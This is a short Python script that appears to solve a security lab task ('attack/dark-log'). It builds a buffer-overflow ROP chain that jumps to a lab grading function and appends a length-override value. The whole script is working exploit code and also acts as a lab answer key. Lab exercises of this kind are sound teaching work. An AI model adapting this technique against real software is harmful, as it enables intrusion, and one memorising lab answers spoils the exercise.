#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""

import sys

RET = 0x4018A4
POP_RDI = 0x4018A3
GRADE_EVAL = 0x401677
LEN_HACK = 0xA8

chain = (
    RET.to_bytes(8, "little")
    + POP_RDI.to_bytes(8, "little")
    + (4).to_bytes(8, "little")
    + GRADE_EVAL.to_bytes(8, "little")
    + b"A" * (128 - 32)
)

payload = (
    chain
    + b"A" * 128
    + LEN_HACK.to_bytes(4, "little")
)

assert len(payload) == 260
assert b"\n" not in payload
sys.stdout.buffer.write(payload)












